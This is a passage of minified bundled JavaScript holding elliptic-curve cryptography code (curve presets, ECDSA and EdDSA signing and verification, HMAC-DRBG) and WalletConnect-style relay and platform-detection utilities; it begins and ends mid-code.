f0d7c0d5f26c3791efefa79597654e7a2b2464f52b1ee6c1347769ef57","712fcdd1b9053f09003a3481fa7762e9ffd7c8ef35a38509e2fbf2629008373"],["176e26989a43c9cfeba4029c202538c28172e566e3c4fce7322857f3be327d66","ed8cc9d04b29eb877d270b4878dc43c19aefd31f4eee09ee7b47834c1fa4b1c3"],["75d46efea3771e6e68abb89a13ad747ecf1892393dfc4f1b7004788c50374da8","9852390a99507679fd0b86fd2b39a868d7efc22151346e1a3ca4726586a6bed8"],["809a20c67d64900ffb698c4c825f6d5f2310fb0451c869345b7319f645605721","9e994980d9917e22b76b061927fa04143d096ccc54963e6a5ebfa5f3f8e286c1"],["1b38903a43f7f114ed4500b4eac7083fdefece1cf29c63528d563446f972c180","4036edc931a60ae889353f77fd53de4a2708b26b6f5da72ad3394119daf408f9"]]}}),PS}var AU;function aR(){return AU||(AU=1,function(r){var e=r,t=Rx(),i=SQ(),n=wl(),s=n.assert;function o(l){l.type==="short"?this.curve=new i.short(l):l.type==="edwards"?this.curve=new i.edwards(l):this.curve=new i.mont(l),this.g=this.curve.g,this.n=this.curve.n,this.hash=l.hash,s(this.g.validate(),"Invalid curve"),s(this.g.mul(this.n).isInfinity(),"Invalid curve, G*N != O")}e.PresetCurve=o;function a(l,u){Object.defineProperty(e,l,{configurable:!0,enumerable:!0,get:function(){var d=new o(u);return Object.defineProperty(e,l,{configurable:!0,enumerable:!0,value:d}),d}})}a("p192",{type:"short",prime:"p192",p:"ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff",a:"ffffffff ffffffff ffffffff fffffffe ffffffff fffffffc",b:"64210519 e59c80e7 0fa7e9ab 72243049 feb8deec c146b9b1",n:"ffffffff ffffffff ffffffff 99def836 146bc9b1 b4d22831",hash:t.sha256,gRed:!1,g:["188da80e b03090f6 7cbf20eb 43a18800 f4ff0afd 82ff1012","07192b95 ffc8da78 631011ed 6b24cdd5 73f977a1 1e794811"]}),a("p224",{type:"short",prime:"p224",p:"ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001",a:"ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff fffffffe",b:"b4050a85 0c04b3ab f5413256 5044b0b7 d7bfd8ba 270b3943 2355ffb4",n:"ffffffff ffffffff ffffffff ffff16a2 e0b8f03e 13dd2945 5c5c2a3d",hash:t.sha256,gRed:!1,g:["b70e0cbd 6bb4bf7f 321390b9 4a03c1d3 56c21122 343280d6 115c1d21","bd376388 b5f723fb 4c22dfe6 cd4375a0 5a074764 44d58199 85007e34"]}),a("p256",{type:"short",prime:null,p:"ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff ffffffff",a:"ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff fffffffc",b:"5ac635d8 aa3a93e7 b3ebbd55 769886bc 651d06b0 cc53b0f6 3bce3c3e 27d2604b",n:"ffffffff 00000000 ffffffff ffffffff bce6faad a7179e84 f3b9cac2 fc632551",hash:t.sha256,gRed:!1,g:["6b17d1f2 e12c4247 f8bce6e5 63a440f2 77037d81 2deb33a0 f4a13945 d898c296","4fe342e2 fe1a7f9b 8ee7eb4a 7c0f9e16 2bce3357 6b315ece cbb64068 37bf51f5"]}),a("p384",{type:"short",prime:null,p:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 ffffffff",a:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 fffffffc",b:"b3312fa7 e23ee7e4 988e056b e3f82d19 181d9c6e fe814112 0314088f 5013875a c656398d 8a2ed19d 2a85c8ed d3ec2aef",n:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff c7634d81 f4372ddf 581a0db2 48b0a77a ecec196a ccc52973",hash:t.sha384,gRed:!1,g:["aa87ca22 be8b0537 8eb1c71e f320ad74 6e1d3b62 8ba79b98 59f741e0 82542a38 5502f25d bf55296c 3a545e38 72760ab7","3617de4a 96262c6f 5d9e98bf 9292dc29 f8f41dbd 289a147c e9da3113 b5f0b8c0 0a60b1ce 1d7e819d 7a431d7c 90ea0e5f"]}),a("p521",{type:"short",prime:null,p:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff",a:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffc",b:"00000051 953eb961 8e1c9a1f 929a21a0 b68540ee a2da725b 99b315f3 b8b48991 8ef109e1 56193951 ec7e937b 1652c0bd 3bb1bf07 3573df88 3d2c34f1 ef451fd4 6b503f00",n:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffa 51868783 bf2f966b 7fcc0148 f709a5d0 3bb5c9b8 899c47ae bb6fb71e 91386409",hash:t.sha512,gRed:!1,g:["000000c6 858e06b7 0404e9cd 9e3ecb66 2395b442 9c648139 053fb521 f828af60 6b4d3dba a14b5e77 efe75928 fe1dc127 a2ffa8de 3348b3c1 856a429b f97e7e31 c2e5bd66","00000118 39296a78 9a3bc004 5c8a5fb4 2c7d1bd9 98f54449 579b4468 17afbd17 273e662c 97ee7299 5ef42640 c550b901 3fad0761 353c7086 a272c240 88be9476 9fd16650"]}),a("curve25519",{type:"mont",prime:"p25519",p:"7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",a:"76d06",b:"1",n:"1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",hash:t.sha256,gRed:!1,g:["9"]}),a("ed25519",{type:"edwards",prime:"p25519",p:"7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",a:"-1",c:"1",d:"52036cee2b6ffe73 8cc740797779e898 00700a4d4141d8ab 75eb4dca135978a3",n:"1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",hash:t.sha256,gRed:!1,g:["216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a","6666666666666666666666666666666666666666666666666666666666666658"]});var c;try{c=Zve()}catch{c=void 0}a("secp256k1",{type:"short",prime:"k256",p:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f",a:"0",b:"7",n:"ffffffff ffffffff ffffffff fffffffe baaedce6 af48a03b bfd25e8c d0364141",h:"1",hash:t.sha256,beta:"7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee",lambda:"5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72",basis:[{a:"3086d221a7d46bcde86c90e49284eb15",b:"-e4437ed6010e88286f547fa90abfe4c3"},{a:"114ca50f7a8e2f3f657c1108d9d44cfd8",b:"3086d221a7d46bcde86c90e49284eb15"}],gRed:!1,g:["79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798","483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8",c]})}(NS)),NS}var $S,IU;function Yve(){if(IU)return $S;IU=1;var r=Rx(),e=EQ(),t=Kg();function i(n){if(!(this instanceof i))return new i(n);this.hash=n.hash,this.predResist=!!n.predResist,this.outLen=this.hash.outSize,this.minEntropy=n.minEntropy||this.hash.hmacStrength,this._reseed=null,this.reseedInterval=null,this.K=null,this.V=null;var s=e.toArray(n.entropy,n.entropyEnc||"hex"),o=e.toArray(n.nonce,n.nonceEnc||"hex"),a=e.toArray(n.pers,n.persEnc||"hex");t(s.length>=this.minEntropy/8,"Not enough entropy. Minimum is: "+this.minEntropy+" bits"),this._init(s,o,a)}return $S=i,i.prototype._init=function(s,o,a){var c=s.concat(o).concat(a);this.K=new Array(this.outLen/8),this.V=new Array(this.outLen/8);for(var l=0;l<this.V.length;l++)this.K[l]=0,this.V[l]=1;this._update(c),this._reseed=1,this.reseedInterval=281474976710656},i.prototype._hmac=function(){return new r.hmac(this.hash,this.K)},i.prototype._update=function(s){var o=this._hmac().update(this.V).update([0]);s&&(o=o.update(s)),this.K=o.digest(),this.V=this._hmac().update(this.V).digest(),s&&(this.K=this._hmac().update(this.V).update([1]).update(s).digest(),this.V=this._hmac().update(this.V).digest())},i.prototype.reseed=function(s,o,a,c){typeof o!="string"&&(c=a,a=o,o=null),s=e.toArray(s,o),a=e.toArray(a,c),t(s.length>=this.minEntropy/8,"Not enough entropy. Minimum is: "+this.minEntropy+" bits"),this._update(s.concat(a||[])),this._reseed=1},i.prototype.generate=function(s,o,a,c){if(this._reseed>this.reseedInterval)throw new Error("Reseed is required");typeof o!="string"&&(c=a,a=o,o=null),a&&(a=e.toArray(a,c||"hex"),this._update(a));for(var l=[];l.length<s;)this.V=this._hmac().update(this.V).digest(),l=l.concat(this.V);var u=l.slice(0,s);return this._update(a),this._reseed++,e.encode(u,o)},$S}var RS,TU;function Jve(){if(TU)return RS;TU=1;var r=k0(),e=wl(),t=e.assert;function i(n,s){this.ec=n,this.priv=null,this.pub=null,s.priv&&this._importPrivate(s.priv,s.privEnc),s.pub&&this._importPublic(s.pub,s.pubEnc)}return RS=i,i.fromPublic=function(s,o,a){return o instanceof i?o:new i(s,{pub:o,pubEnc:a})},i.fromPrivate=function(s,o,a){return o instanceof i?o:new i(s,{priv:o,privEnc:a})},i.prototype.validate=function(){var s=this.getPublic();return s.isInfinity()?{result:!1,reason:"Invalid public key"}:s.validate()?s.mul(this.ec.curve.n).isInfinity()?{result:!0,reason:null}:{result:!1,reason:"Public key * N != O"}:{result:!1,reason:"Public key is not a point"}},i.prototype.getPublic=function(s,o){return typeof s=="string"&&(o=s,s=null),this.pub||(this.pub=this.ec.g.mul(this.priv)),o?this.pub.encode(o,s):this.pub},i.prototype.getPrivate=function(s){return s==="hex"?this.priv.toString(16,2):this.priv},i.prototype._importPrivate=function(s,o){this.priv=new r(s,o||16),this.priv=this.priv.umod(this.ec.curve.n)},i.prototype._importPublic=function(s,o){if(s.x||s.y){this.ec.curve.type==="mont"?t(s.x,"Need x coordinate"):(this.ec.curve.type==="short"||this.ec.curve.type==="edwards")&&t(s.x&&s.y,"Need both x and y coordinate"),this.pub=this.ec.curve.point(s.x,s.y);return}this.pub=this.ec.curve.decodePoint(s,o)},i.prototype.derive=function(s){return s.validate()||t(s.validate(),"public point not validated"),s.mul(this.priv).getX()},i.prototype.sign=function(s,o,a){return this.ec.sign(s,this,o,a)},i.prototype.verify=function(s,o,a){return this.ec.verify(s,o,this,void 0,a)},i.prototype.inspect=function(){return"<Key priv: "+(this.priv&&this.priv.toString(16,2))+" pub: "+(this.pub&&this.pub.inspect())+" >"},RS}var OS,kU;function Qve(){if(kU)return OS;kU=1;var r=k0(),e=wl(),t=e.assert;function i(c,l){if(c instanceof i)return c;this._importDER(c,l)||(t(c.r&&c.s,"Signature without r or s"),this.r=new r(c.r,16),this.s=new r(c.s,16),c.recoveryParam===void 0?this.recoveryParam=null:this.recoveryParam=c.recoveryParam)}OS=i;function n(){this.place=0}function s(c,l){var u=c[l.place++];if(!(u&128))return u;var d=u&15;if(d===0||d>4||c[l.place]===0)return!1;for(var h=0,f=0,p=l.place;f<d;f++,p++)h<<=8,h|=c[p],h>>>=0;return h<=127?!1:(l.place=p,h)}function o(c){for(var l=0,u=c.length-1;!c[l]&&!(c[l+1]&128)&&l<u;)l++;return l===0?c:c.slice(l)}i.prototype._importDER=function(l,u){l=e.toArray(l,u);var d=new n;if(l[d.place++]!==48)return!1;var h=s(l,d);if(h===!1||h+d.place!==l.length||l[d.place++]!==2)return!1;var f=s(l,d);if(f===!1||(l[d.place]&128)!==0)return!1;var p=l.slice(d.place,f+d.place);if(d.place+=f,l[d.place++]!==2)return!1;var g=s(l,d);if(g===!1||l.length!==g+d.place||(l[d.place]&128)!==0)return!1;var w=l.slice(d.place,g+d.place);if(p[0]===0)if(p[1]&128)p=p.slice(1);else return!1;if(w[0]===0)if(w[1]&128)w=w.slice(1);else return!1;return this.r=new r(p),this.s=new r(w),this.recoveryParam=null,!0};function a(c,l){if(l<128){c.push(l);return}var u=1+(Math.log(l)/Math.LN2>>>3);for(c.push(u|128);--u;)c.push(l>>>(u<<3)&255);c.push(l)}return i.prototype.toDER=function(l){var u=this.r.toArray(),d=this.s.toArray();for(u[0]&128&&(u=[0].concat(u)),d[0]&128&&(d=[0].concat(d)),u=o(u),d=o(d);!d[0]&&!(d[1]&128);)d=d.slice(1);var h=[2];a(h,u.length),h=h.concat(u),h.push(2),a(h,d.length);var f=h.concat(d),p=[48];return a(p,f.length),p=p.concat(f),e.encode(p,l)},OS}var BS,NU;function Xve(){if(NU)return BS;NU=1;var r=k0(),e=Yve(),t=wl(),i=aR(),n=_Q(),s=t.assert,o=Jve(),a=Qve();function c(l){if(!(this instanceof c))return new c(l);typeof l=="string"&&(s(Object.prototype.hasOwnProperty.call(i,l),"Unknown curve "+l),l=i[l]),l instanceof i.PresetCurve&&(l={curve:l}),this.curve=l.curve.curve,this.n=this.curve.n,this.nh=this.n.ushrn(1),this.g=this.curve.g,this.g=l.curve.g,this.g.precompute(l.curve.n.bitLength()+1),this.hash=l.hash||l.curve.hash}return BS=c,c.prototype.keyPair=function(u){return new o(this,u)},c.prototype.keyFromPrivate=function(u,d){return o.fromPrivate(this,u,d)},c.prototype.keyFromPublic=function(u,d){return o.fromPublic(this,u,d)},c.prototype.genKeyPair=function(u){u||(u={});for(var d=new e({hash:this.hash,pers:u.pers,persEnc:u.persEnc||"utf8",entropy:u.entropy||n(this.hash.hmacStrength),entropyEnc:u.entropy&&u.entropyEnc||"utf8",nonce:this.n.toArray()}),h=this.n.byteLength(),f=this.n.sub(new r(2));;){var p=new r(d.generate(h));if(!(p.cmp(f)>0))return p.iaddn(1),this.keyFromPrivate(p)}},c.prototype._truncateToN=function(u,d,h){var f;if(r.isBN(u)||typeof u=="number")u=new r(u,16),f=u.byteLength();else if(typeof u=="object")f=u.length,u=new r(u,16);else{var p=u.toString();f=p.length+1>>>1,u=new r(p,16)}typeof h!="number"&&(h=f*8);var g=h-this.n.bitLength();return g>0&&(u=u.ushrn(g)),!d&&u.cmp(this.n)>=0?u.sub(this.n):u},c.prototype.sign=function(u,d,h,f){if(typeof h=="object"&&(f=h,h=null),f||(f={}),typeof u!="string"&&typeof u!="number"&&!r.isBN(u)){s(typeof u=="object"&&u&&typeof u.length=="number","Expected message to be an array-like, a hex string, or a BN instance"),s(u.length>>>0===u.length);for(var p=0;p<u.length;p++)s((u[p]&255)===u[p])}d=this.keyFromPrivate(d,h),u=this._truncateToN(u,!1,f.msgBitLength),s(!u.isNeg(),"Can not sign a negative message");var g=this.n.byteLength(),w=d.getPrivate().toArray("be",g),m=u.toArray("be",g);s(new r(m).eq(u),"Can not sign message");for(var x=new e({hash:this.hash,entropy:w,nonce:m,pers:f.pers,persEnc:f.persEnc||"utf8"}),S=this.n.sub(new r(1)),T=0;;T++){var k=f.k?f.k(T):new r(x.generate(this.n.byteLength()));if(k=this._truncateToN(k,!0),!(k.cmpn(1)<=0||k.cmp(S)>=0)){var I=this.g.mul(k);if(!I.isInfinity()){var E=I.getX(),C=E.umod(this.n);if(C.cmpn(0)!==0){var N=k.invm(this.n).mul(C.mul(d.getPrivate()).iadd(u));if(N=N.umod(this.n),N.cmpn(0)!==0){var L=(I.getY().isOdd()?1:0)|(E.cmp(C)!==0?2:0);return f.canonical&&N.cmp(this.nh)>0&&(N=this.n.sub(N),L^=1),new a({r:C,s:N,recoveryParam:L})}}}}}},c.prototype.verify=function(u,d,h,f,p){p||(p={}),u=this._truncateToN(u,!1,p.msgBitLength),h=this.keyFromPublic(h,f),d=new a(d,"hex");var g=d.r,w=d.s;if(g.cmpn(1)<0||g.cmp(this.n)>=0||w.cmpn(1)<0||w.cmp(this.n)>=0)return!1;var m=w.invm(this.n),x=m.mul(u).umod(this.n),S=m.mul(g).umod(this.n),T;return this.curve._maxwellTrick?(T=this.g.jmulAdd(x,h.getPublic(),S),T.isInfinity()?!1:T.eqXToP(g)):(T=this.g.mulAdd(x,h.getPublic(),S),T.isInfinity()?!1:T.getX().umod(this.n).cmp(g)===0)},c.prototype.recoverPubKey=function(l,u,d,h){s((3&d)===d,"The recovery param is more than two bits"),u=new a(u,h);var f=this.n,p=new r(l),g=u.r,w=u.s,m=d&1,x=d>>1;if(g.cmp(this.curve.p.umod(this.curve.n))>=0&&x)throw new Error("Unable to find sencond key candinate");x?g=this.curve.pointFromX(g.add(this.curve.n),m):g=this.curve.pointFromX(g,m);var S=u.r.invm(f),T=f.sub(p).mul(S).umod(f),k=w.mul(S).umod(f);return this.g.mulAdd(T,g,k)},c.prototype.getKeyRecoveryParam=function(l,u,d,h){if(u=new a(u,h),u.recoveryParam!==null)return u.recoveryParam;for(var f=0;f<4;f++){var p;try{p=this.recoverPubKey(l,u,f)}catch{continue}if(p.eq(d))return f}throw new Error("Unable to find valid recovery factor")},BS}var MS,PU;function eye(){if(PU)return MS;PU=1;var r=wl(),e=r.assert,t=r.parseBytes,i=r.cachedProperty;function n(s,o){this.eddsa=s,this._secret=t(o.secret),s.isPoint(o.pub)?this._pub=o.pub:this._pubBytes=t(o.pub)}return n.fromPublic=function(o,a){return a instanceof n?a:new n(o,{pub:a})},n.fromSecret=function(o,a){return a instanceof n?a:new n(o,{secret:a})},n.prototype.secret=function(){return this._secret},i(n,"pubBytes",function(){return this.eddsa.encodePoint(this.pub())}),i(n,"pub",function(){return this._pubBytes?this.eddsa.decodePoint(this._pubBytes):this.eddsa.g.mul(this.priv())}),i(n,"privBytes",function(){var o=this.eddsa,a=this.hash(),c=o.encodingLength-1,l=a.slice(0,o.encodingLength);return l[0]&=248,l[c]&=127,l[c]|=64,l}),i(n,"priv",function(){return this.eddsa.decodeInt(this.privBytes())}),i(n,"hash",function(){return this.eddsa.hash().update(this.secret()).digest()}),i(n,"messagePrefix",function(){return this.hash().slice(this.eddsa.encodingLength)}),n.prototype.sign=function(o){return e(this._secret,"KeyPair can only verify"),this.eddsa.sign(o,this)},n.prototype.verify=function(o,a){return this.eddsa.verify(o,a,this)},n.prototype.getSecret=function(o){return e(this._secret,"KeyPair is public only"),r.encode(this.secret(),o)},n.prototype.getPublic=function(o){return r.encode(this.pubBytes(),o)},MS=n,MS}var DS,$U;function tye(){if($U)return DS;$U=1;var r=k0(),e=wl(),t=e.assert,i=e.cachedProperty,n=e.parseBytes;function s(o,a){this.eddsa=o,typeof a!="object"&&(a=n(a)),Array.isArray(a)&&(t(a.length===o.encodingLength*2,"Signature has invalid size"),a={R:a.slice(0,o.encodingLength),S:a.slice(o.encodingLength)}),t(a.R&&a.S,"Signature without R or S"),o.isPoint(a.R)&&(this._R=a.R),a.S instanceof r&&(this._S=a.S),this._Rencoded=Array.isArray(a.R)?a.R:a.Rencoded,this._Sencoded=Array.isArray(a.S)?a.S:a.Sencoded}return i(s,"S",function(){return this.eddsa.decodeInt(this.Sencoded())}),i(s,"R",function(){return this.eddsa.decodePoint(this.Rencoded())}),i(s,"Rencoded",function(){return this.eddsa.encodePoint(this.R())}),i(s,"Sencoded",function(){return this.eddsa.encodeInt(this.S())}),s.prototype.toBytes=function(){return this.Rencoded().concat(this.Sencoded())},s.prototype.toHex=function(){return e.encode(this.toBytes(),"hex").toUpperCase()},DS=s,DS}var LS,RU;function rye(){if(RU)return LS;RU=1;var r=Rx(),e=aR(),t=wl(),i=t.assert,n=t.parseBytes,s=eye(),o=tye();function a(c){if(i(c==="ed25519","only tested with ed25519 so far"),!(this instanceof a))return new a(c);c=e[c].curve,this.curve=c,this.g=c.g,this.g.precompute(c.n.bitLength()+1),this.pointClass=c.point().constructor,this.encodingLength=Math.ceil(c.n.bitLength()/8),this.hash=r.sha512}return LS=a,a.prototype.sign=function(l,u){l=n(l);var d=this.keyFromSecret(u),h=this.hashInt(d.messagePrefix(),l),f=this.g.mul(h),p=this.encodePoint(f),g=this.hashInt(p,d.pubBytes(),l).mul(d.priv()),w=h.add(g).umod(this.curve.n);return this.makeSignature({R:f,S:w,Rencoded:p})},a.prototype.verify=function(l,u,d){if(l=n(l),u=this.makeSignature(u),u.S().gte(u.eddsa.curve.n)||u.S().isNeg())return!1;var h=this.keyFromPublic(d),f=this.hashInt(u.Rencoded(),h.pubBytes(),l),p=this.g.mul(u.S()),g=u.R().add(h.pub().mul(f));return g.eq(p)},a.prototype.hashInt=function(){for(var l=this.hash(),u=0;u<arguments.length;u++)l.update(arguments[u]);return t.intFromLE(l.digest()).umod(this.curve.n)},a.prototype.keyFromPublic=function(l){return s.fromPublic(this,l)},a.prototype.keyFromSecret=function(l){return s.fromSecret(this,l)},a.prototype.makeSignature=function(l){return l instanceof o?l:new o(this,l)},a.prototype.encodePoint=function(l){var u=l.getY().toArray("le",this.encodingLength);return u[this.encodingLength-1]|=l.getX().isOdd()?128:0,u},a.prototype.decodePoint=function(l){l=t.parseBytes(l);var u=l.length-1,d=l.slice(0,u).concat(l[u]&-129),h=(l[u]&128)!==0,f=t.intFromLE(d);return this.curve.pointFromY(f,h)},a.prototype.encodeInt=function(l){return l.toArray("le",this.encodingLength)},a.prototype.decodeInt=function(l){return t.intFromLE(l)},a.prototype.isPoint=function(l){return l instanceof this.pointClass},LS}var OU;function iye(){return OU||(OU=1,function(r){var e=r;e.version=Wve.version,e.utils=wl(),e.rand=_Q(),e.curve=SQ(),e.curves=aR(),e.ec=Xve(),e.eddsa=rye()}(CS)),CS}var nye=iye();const cR={waku:{publish:"waku_publish",batchPublish:"waku_batchPublish",subscribe:"waku_subscribe",batchSubscribe:"waku_batchSubscribe",subscription:"waku_subscription",unsubscribe:"waku_unsubscribe",batchUnsubscribe:"waku_batchUnsubscribe",batchFetchMessages:"waku_batchFetchMessages"},irn:{publish:"irn_publish",batchPublish:"irn_batchPublish",subscribe:"irn_subscribe",batchSubscribe:"irn_batchSubscribe",subscription:"irn_subscription",unsubscribe:"irn_unsubscribe",batchUnsubscribe:"irn_batchUnsubscribe",batchFetchMessages:"irn_batchFetchMessages"},iridium:{publish:"iridium_publish",batchPublish:"iridium_batchPublish",subscribe:"iridium_subscribe",batchSubscribe:"iridium_batchSubscribe",subscription:"iridium_subscription",unsubscribe:"iridium_unsubscribe",batchUnsubscribe:"iridium_batchUnsubscribe",batchFetchMessages:"iridium_batchFetchMessages"}};var sye={};const oye=":";function nw(r){const[e,t]=r.split(oye);return{namespace:e,reference:t}}function AQ(r,e){return r.includes(":")?[r]:e.chains||[]}const aye="ReactNative",lc={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},cye="js";function a7(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function Sp(){return!vn.getDocument()&&!!vn.getNavigator()&&navigator.product===aye}function lye(){return Sp()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="android"}function uye(){return Sp()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="ios"}function d4(){return!a7()&&!!vn.getNavigator()&&!!vn.getDocument()}function h4(){return Sp()?lc.reactNative:a7()?lc.node:d4()?lc.browser:lc.unknown}function BU(){var r;try{return Sp()&&typeof global<"u"&&typeof(global==null?void 0:global.Application)<"u"?(r=global.Application)==null?void 0:r.applicationId:void 0}catch{return}}function dye(r,e){const t=new URLSearchParams(r);for(const i of Object.keys(e).sort())if(e.hasOwnProperty(i)){const n=e[i];n!==void 0&&t.set(i,n)}return t.toString()}function IQ(){return oR.getWindowMetadata()||{name:"",description:"",url:"",icons:[""]}}function hye(){if(h4()===lc.reactNative&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"){const{OS:t,Version:i}=global.Platform;return[t,i].join("-")}const r=sR();if(r===null)return"unknown";const e=r.os?r.os.replace(" ","").toLowerCase():"unknown";return r.type==="browser"?[e,r.name,r.version].join("-"):[e,r.version].join("-")}function fye(){var r;const e=h4();return e===lc.browser?[e,((r=vn.getLocation())==null?void 0:r.host)||"unknown"].join(":"):e}function TQ(r,e,t){const i=hye(),n=fye();return[[r,e].join("-"),[cye,t].join("-"),i,n].join("/")}function pye({protocol:r,version:e,relayUrl:t,sdkVersion:i,auth:n,projectId:s,useOnCloseEvent:o,bundleId:a,packageName:c}){const l=t.split("?"),u=TQ(r,e,i),d={auth:n,ua:u,projectId:s,useOnCloseEvent:o,packageName:c||void 0,bundleId:a||void 0},h=dye(l[1]||"",d);return l[0]+"?"+h}function v1(r,e){return r.filter(t=>e.includes(t)).length===r.length}function kQ(r){return Object.fromEntries(r.entries())}function NQ(r){return new Map(Object.entries(r))}function Qp(r=fe.FIVE_MINUTES,e){const t=fe.toMiliseconds(r||fe.FIVE_MINUTES);let i,n,s,o;return{resolve:a=>{s&&i&&(clearTimeout(s),i(a),o=Promise.resolve(a))},reject:a=>{s&&n&&(clearTimeout(s),n(a))},done:()=>new Promise((a,c)=>{if(o)return a(o);s=setTimeout(()=>{const l=new Error(e);o=Promise.reject(l),c(l)},t),i=a,n=c})}}function $f(r,e,t){return new Promise(async(i,n)=>{const s=setTimeout(()=>n(new Error(t)),e);try{const o=await r;i(o)}catch(o){n(o)}clearTimeout(s)})}function PQ(r,e){if(typeof e=="string"&&e.startsWith(`${r}:`))return e;if(r.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else if(r.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${r}`)}function gye(r){return PQ("topic",r)}function mye(r){return PQ("id",r)}function $Q(r){const[e,t]=r.split(":"),i={id:void 0,topic:void 0};if(e==="topic"&&typeof t=="string")i.topic=t;else if(e==="id"&&Number.isInteger(Number(t)))i.id=Number(t);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${t}`);return i}function ms(r,e){return fe.fromMiliseconds(Date.now()+fe.toMiliseconds(r))}function yf(r){return Date.now()>=fe.toMiliseconds(r)}function qr(r,e){return`${r}${e?`:${e}`:""}`}function o9(r=[],e=[]){return[...new Set([...r,...e])]}async function wye({id:r,topic:e,wcDeepLink:t}){var i;try{if(!t)return;const n=typeof t=="string"?JSON.parse(t):t,s=n?.href;if(typeof s!="string")return;const o=bye(s,r,e),a=h4();if(a===lc.browser){if(!((i=vn.getDocument())!=null&&i.hasFocus())){console.warn("Document does not have focus, skipping deeplink.");return}vye(o)}else a===lc.reactNative&&typeof(global==null?void 0:global.Linking)<"u"&&await global.Linking.openURL(o)}catch(n){console.error(n)}}function bye(r,e,t){const i=`requestId=${e}&sessionTopic=${t}`;r.endsWith("/")&&(r=r.slice(0,-1));let n=`${r}`;if(r.startsWith("https://t.me")){const s=r.includes("?")?"&startapp=":"?startapp=";n=`${n}${s}${Eye(i,!0)}`}else n=`${n}/wc?${i}`;return n}function vye(r){let e="_self";Cye()?e="_top":(xye()||r.startsWith("https://")||r.startsWith("http://"))&&(e="_blank"),window.open(r,e,"noreferrer noopener")}async function yye(r,e){let t="";try{if(d4()&&(t=localStorage.getItem(e),t))return t;t=await r.getItem(e)}catch(i){console.error(i)}return t}function MU(r,e){if(!r.includes(e))return null;const t=r.split(/([&,?,=])/),i=t.indexOf(e);return t[i+2]}function DU(){return typeof crypto<"u"&&crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,r=>{const e=Math.random()*16|0;return(r==="x"?e:e&3|8).toString(16)})}function lR(){return typeof process<"u"&&sye.IS_VITEST==="true"}function xye(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)}function Cye(){try{return window.self!==window.top}catch{return!1}}function Eye(r,e=!1){const t=Buffer.from(r).toString("base64");return e?t.replace(/[=]/g,""):t}function RQ(r){return Buffer.from(r,"base64").toString("utf-8")}function _ye(r){return new Promise(e=>setTimeout(e,r))}function Wv(r){if(!Number.isSafeInteger(r)||r<0)throw new Error("positive integer expected, got "+r)}function Sye(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function aC(r,...e){if(!Sye(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function uR(r){if(typeof r!="function"||typeof r.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");Wv(r.outputLen),Wv(r.blockLen)}function Tw(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function OQ(r,e){aC(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}const Z6=BigInt(2**32-1),LU=BigInt(32);function Aye(r,e=!1){return e?{h:Number(r&Z6),l:Number(r>>LU&Z6)}:{h:Number(r>>LU&Z6)|0,l:Number(r&Z6)|0}}function Iye(r,e=!1){let t=new Uint32Array(r.length),i=new Uint32Array(r.length);for(let n=0;n<r.length;n++){const{h:s,l:o}=Aye(r[n],e);[t[n],i[n]]=[s,o]}return[t,i]}const Tye=(r,e,t)=>r<<t|e>>>32-t,kye=(r,e,t)=>e<<t|r>>>32-t,Nye=(r,e,t)=>e<<t-32|r>>>64-t,Pye=(r,e,t)=>r<<t-32|e>>>64-t,j2=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function $ye(r){return new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength/4))}function US(r){return new DataView(r.buffer,r.byteOffset,r.byteLength)}function Uu(r,e){return r<<32-e|r>>>e}const UU=new Uint8Array(new 